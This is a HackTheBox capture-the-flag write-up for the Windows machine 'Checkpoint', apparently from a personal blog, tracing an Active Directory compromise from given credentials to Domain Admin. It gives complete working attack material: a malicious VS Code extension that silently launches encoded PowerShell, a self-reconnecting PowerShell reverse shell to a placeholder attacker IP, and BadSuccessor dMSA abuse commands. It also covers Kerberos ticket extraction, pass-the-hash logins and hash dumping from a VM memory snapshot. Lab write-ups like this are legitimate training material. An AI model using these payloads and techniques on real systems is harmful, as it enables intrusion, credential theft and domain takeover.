---
title: "HTB - Checkpoint"
date: 2026-06-13
tags: ["HackTheBox", "Windows", "Medium", "ActiveDirectory", "BadSuccessor", "VSIX", "Forensics"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Windows"
author: "z3r0s"
featuredImage: "/logos/Checkpoint.png"
---
**Difficulty:** Medium | **OS:** Windows

---

## Logo & Name Analysis - First Impressions

Before starting our pentest, the machine logo and name offer some interesting context clues.

### The Logo
The logo shows a traveler in a green cloak holding a staff, standing before a massive, reinforced iron gate (portcullis) inside a purple stone vault or dungeon.
- **The Portcullis:** Represents a barrier or "checkpoint" preventing unauthorized entry.
- **The Traveler:** Symbolizes the auditor or attacker looking for credentials or a key to open the gate and penetrate the internal domain.

### The Name
"Checkpoint" suggests:
- A gateway or barrier where credentials, tokens, or tickets (like Kerberos TGTs) must be validated.
- An assumed-breach scenario where we must verify access at various stages to move deeper into the Active Directory domain.

### The Instant Hypothesis
> *"This is an Active Directory box that starts with an assumed breach. The name 'Checkpoint' indicates we will be verifying our access at different stages (checkpoints) to move laterally. The foothold will likely involve getting past an initial access barrier using credentials, followed by lateral movement through Active Directory privileges or misconfigured service accounts, and escalating to Domain Admin by exploiting a Windows Server feature or credential reuse."*

<!--more-->

## Machine Information
As is common in real life pentests, you will start the Checkpoint box with credentials for the following account: `alex.turner / Checkpoint2024!`

---

## Overview

Checkpoint is an assumed-breach Active Directory box. We start with valid domain credentials for a low-privilege user and work our way to Domain Admin through a chain of AD enumeration, a malicious VS Code extension, BadSuccessor (CVE-2025-29810), and VM memory forensics.

**Starting credentials:** `alex.turner / Checkpoint2024!`

---

## Enumeration

### Initial Recon
```
rustscan -a <TARGET_IP> --ulimit 5000 -- -sC -sV
```
Key ports:

- 53 (DNS)

- 88 (Kerberos)

- 135, 139, 445 (SMB/RPC)

- 389, 636 (LDAP/LDAPS)

- 5985 (WinRM)

- 3389 (RDP)

Hostname: `DC01.checkpoint.htb`

### SMB Enumeration
```
nxc smb <TARGET_IP> -u alex.turner -p 'Checkpoint2024!' --shares
```
Shares found:

- `DevDrop` - VS Code extensions share

- `VMBackups` - readable but nothing interesting yet

### AD Enumeration
```
nxc ldap dc01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users
```
Ran bloodyAD to check for writable objects and interesting ACLs:
```
bloodyAD -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -H dc01.checkpoint.htb get writable
```
Found alex.turner had write access to deleted objects. Checked the AD Recycle Bin using the show-deleted LDAP control `1.2.840.113556.1.4.417`:
```
bloodyAD -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -H dc01.checkpoint.htb \

get object 'DC=checkpoint,DC=htb' --attr * --controls 1.2.840.113556.1.4.417
```
Found a deleted user: `mark.davies`. Restored the account and password sprayed with the box default.

### Password Spray
```
nxc smb dc01.checkpoint.htb -u mark.davies -p 'Checkpoint2024!'
```
Hit. `mark.davies:Checkpoint2024!`

### ACL Audit on mark.davies

mark.davies had `FILE_WRITE_DATA` on the `DevDrop` SMB share, which is described as a VS Code extensions drop point.

---

## Foothold - Malicious VSIX

### Building the Extension

VS Code extensions are ZIP files with a `.vsix` extension. The required structure:
```
approved-helper.vsix

├── [Content_Types].xml

├── extension.vsixmanifest

└── extension/

├── package.json

└── extension.js
```
`[Content_Types].xml`:
```xml
<?xml version="1.0" encoding="utf-8"?>

<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">

<Default Extension="vsixmanifest" ContentType="text/xml"/>

<Default Extension="js" ContentType="application/javascript"/>

<Default Extension="json" ContentType="application/json"/>

</Types>
```
`extension.vsixmanifest`:
```xml
<?xml version="1.0" encoding="utf-8"?>

<PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">

<Metadata>

<Identity Language="en-US" Id="approved-helper" Version="1.0.2" Publisher="internal"/>

<DisplayName>Approved Helper</DisplayName>

<Description>Internal approved extension</Description>

</Metadata>

<Assets>

<Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json"/>

</Assets>

</PackageManifest>
```
`extension/package.json`:
```json
{

"name": "approved-helper",

"version": "1.0.2",

"engines": { "vscode": "^1.118.0" },

"activationEvents": ["*"],

"main": "./extension.js"

}
```
`extension/extension.js` - spawns a detached hidden PowerShell process. The detached/unref() matters here: VS Code kills direct child processes when the extension host recycles, so the shell would die immediately without it.
```javascript
(function() {

const payload = '<BASE64_ENCODED_POWERSHELL>';

require('child_process').spawn('powershell', ['-WindowStyle','Hidden','-EncodedCommand', payload], {

detached: true,

stdio: 'ignore'

}).unref();

})();

function activate(context) {

const payload = '<BASE64_ENCODED_POWERSHELL>';

require('child_process').spawn('powershell', ['-WindowStyle','Hidden','-EncodedCommand', payload], {

detached: true,

stdio: 'ignore'

}).unref();

}

module.exports = { activate };
```
The PowerShell payload loops and reconnects on failure so the shell survives listener restarts:
```powershell
while($true){

try{

$c=New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",4444)

$s=$c.GetStream()

[byte[]]$b=0..65535|%{0}

while(($i=$s.Read($b,0,$b.Length)) -ne 0){

$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i)

$sb=(iex $d 2>&1 | Out-String)

$sb2=$sb+"PS "+(pwd).Path+"> "

$sb3=[text.encoding]::ASCII.GetBytes($sb2)

$s.Write($sb3,0,$sb3.Length)

$s.Flush()

}

$c.Close()

}catch{}

Start-Sleep 4

}
```
Encode and pack the extension:
```bash
# Encode the payload

$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)

$b64 = [Convert]::ToBase64String($bytes)

# Pack

cd /tmp/vsix

zip -r ../approved-helper.vsix "[Content_Types].xml" extension.vsixmanifest extension/
```
### Delivery

Set up a persistent listener in tmux so it re-binds after each connection:
```bash
tmux new-session -d -s listener

tmux send-keys -t listener 'while true; do nc -lvnp 4444; done' Enter
```
Upload the extension as mark.davies:
```bash
smbclient //dc01.checkpoint.htb/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!'

smb: \> put approved-helper.vsix
```
Shell back as `ryan.brooks`.

---

## User Flag
```powershell
type C:\Users\ryan.brooks\Desktop\user.txt
```
`**REDACTED**`

---

## Privilege Escalation

### AD ACL Enumeration as ryan.brooks
```
bloodyAD -d checkpoint.htb -u ryan.brooks -H dc01.checkpoint.htb -k get writable
```
ryan.brooks had `CREATE_CHILD` on `OU=DMSAHolder,DC=checkpoint,DC=htb`.

On a Windows Server 2025 domain controller, this is the BadSuccessor primitive.

### BadSuccessor (CVE-2025-29810)

BadSuccessor abuses the Delegated Managed Service Account (dMSA) feature introduced in Windows Server 2025. A dMSA is a managed service account that can be configured to "succeed" an existing service account, inheriting its Kerberos keys. The vulnerability: anyone with `CREATE_CHILD` rights on a dMSA-holding OU can create a weaponized dMSA that inherits the keys of any target account, regardless of whether they have any rights over that target.

**Attack steps:**

1\. Create a dMSA in the target OU

2\. Set `msDS-ManagedAccountPrecededByLink` pointing to the target account

3\. Set `msDS-SupersededServiceAccountState` to 2 on the target

4\. Request a TGT for the dMSA -- it comes back with the target's Kerberos keys in the PA-DATA

First, extract ryan.brooks's TGT from the current session using Rubeus tgtdeleg. This works without elevation by abusing unconstrained delegation negotiation:
```powershell
C:\Windows\Tasks\r.exe tgtdeleg /nowrap
```
Convert the base64 kirbi blob to ccache on the Linux side:
```bash
base64 -d tgt.b64 > ryan.kirbi

impacket-ticketConverter ryan.kirbi ryan.ccache
```
ryan.brooks had `GenericWrite` over `svc_deploy`, which is in `Remote Management Users`. Use SharpSuccessor to create the weaponized dMSA targeting svc_deploy:
```powershell
ss.exe add /impersonate:svc_deploy \

/path:OU=DMSAHolder,DC=checkpoint,DC=htb \

/account:ryan.brooks \

/name:attacker_dMSA3
```
Output confirms success:
```
[+] Created dMSA object 'CN=attacker_dMSA3' in 'OU=DMSAHolder,DC=checkpoint,DC=htb'

[+] Successfully weaponized dMSA object

[+] msDS-SupersededServiceAccountState set to 2

[+] Wrote to target account successfully
```
Use badS4U2self (ships with bloodyAD) to request a TGT for the dMSA. The DC includes the predecessor account's Kerberos keys in the response:
```bash
export KRB5CCNAME=/tmp/ryan.ccache

badS4U2self \

'kerberos+ccache://checkpoint.htb\ryan.brooks:%2Ftmp%2Fryan.ccache@<TARGET_IP>/' \

'krbtgt/checkpoint.htb@checkpoint.htb' \

'attacker_dMSA3$@checkpoint.htb' \

--dmsa \

--ccache /tmp/attacker_dmsa.ccache
```
The output includes svc_deploy's NT hash under the previous keys section:
```
dMSA previous keys found in TGS:

RC4: <SVCDEPLOYRC4HASH>
```
Confirm WinRM access:
```bash
nxc winrm dc01.checkpoint.htb -u svc_deploy -H <SVCDEPLOYRC4HASH>

# [+] Pwn3d!
```
### VM Memory Forensics

svc_deploy is in the `BackupAccess` group with read access to `VMBackups`. The share contained a VMware snapshot of a Windows Server 2019 machine:
```
NightlyBackup_2024-11-01/memory forensics/

├── Windows Server 2019-000001.vmdk      (101 MB, differential disk)

├── Windows Server 2019-Snapshot1.vmem   (2 GB, RAM dump)

├── Windows Server 2019-Snapshot1.vmsn   (131 MB, snapshot state)

└── Windows Server 2019.vmdk             (9.5 GB, base disk)
```
Download the vmem via impacket (PTH with svc_deploy's hash):
```python
from impacket.smbconnection import SMBConnection

conn = SMBConnection('dc01.checkpoint.htb', '<TARGET_IP>')

conn.login('svc_deploy', '', 'checkpoint.htb', '', '<SVCDEPLOYRC4HASH>')

with open('snapshot1.vmem', 'wb') as f:

conn.getFile(

'VMBackups',

'NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmem',

f.write

)
```
Run volatility3 hashdump to pull SAM hashes from the VM's registry hive embedded in the memory dump:
```bash
vol -f snapshot1.vmem windows.hashdump
```
```
User           RID   LMHash                            NTHash

Administrator  500   aad3b435b51404eeaad3b435b51404ee  <ADMINNTLMHASH>
```
Try the hash against DC01:
```bash
nxc smb dc01.checkpoint.htb -u Administrator -H <ADMINNTLMHASH>

# [+] Pwn3d!
```
Password reuse confirmed.

---

## Root Flag

root.txt sits on `max.palmer`'s desktop. max.palmer is the active Domain Admin on this box, not the built-in Administrator account:
```bash
nxc winrm dc01.checkpoint.htb -u Administrator -H <ADMINNTLMHASH> \

-X 'Get-Content C:\Users\max.palmer\Desktop\root.txt'
```
`**REDACTED**`

---

## Tools Used

| Tool | Purpose |

|------|---------|

| bloodyAD | AD ACL enumeration, deleted object restore, object manipulation |

| netexec (nxc) | SMB/WinRM auth, command execution, share access |

| Rubeus | tgtdeleg TGT extraction |

| SharpSuccessor | BadSuccessor dMSA creation and weaponization |

| badS4U2self | dMSA TGT retrieval and predecessor key extraction |

| impacket-ticketConverter | kirbi to ccache conversion |

| volatility3 | SAM hash extraction from VM memory snapshot |

| impacket SMBConnection | Authenticated file download |

---

## Attack Path Summary
```
alex.turner (given creds)

-> bloodyAD: AD Recycle Bin -> restore mark.davies

-> Password spray: mark.davies:Checkpoint2024!

-> mark.davies has DevDrop write

-> Malicious .vsix extension -> Shell as ryan.brooks

-> user.txt

ryan.brooks

-> bloodyAD: CREATE_CHILD on OU=DMSAHolder (Server 2025 DC)

-> CVE-2025-29810 BadSuccessor

-> Rubeus tgtdeleg -> ryan.brooks TGT

-> SharpSuccessor: dMSA created -> inherits svc_deploy

-> badS4U2self: dMSA TGT -> svc_deploy RC4 hash in PA-DATA

-> svc_deploy WinRM + VMBackups read

-> Download VM snapshot (2GB vmem)

-> volatility3 hashdump -> local Administrator NTLM

-> PTH to DC01 as Administrator

-> root.txt on max.palmer Desktop
```
---

## Key Takeaways

**VS Code extension persistence** - The extension host kills direct child processes. Spawning with `detached: true` and calling `.unref()` breaks the parent-child relationship so the shell survives.

**BadSuccessor scope** - You only need `CREATE_CHILD` on one OU. You do not need any rights on the target account itself. A low-privilege user with this single permission can inherit the credentials of any account in the domain, including Domain Admins.

**VM snapshot credential exposure** - VMware `.vmem` files are full RAM dumps. A machine with access to VM backups can pull SAM/NTDS hashes directly from memory without touching the live host. Backup access is effectively credential access.

**Password reuse across VM boundaries** - The Administrator password on the backup VM matched the domain Administrator. Snapshots taken of pre-hardening machines or with shared credentials across environments create this risk.
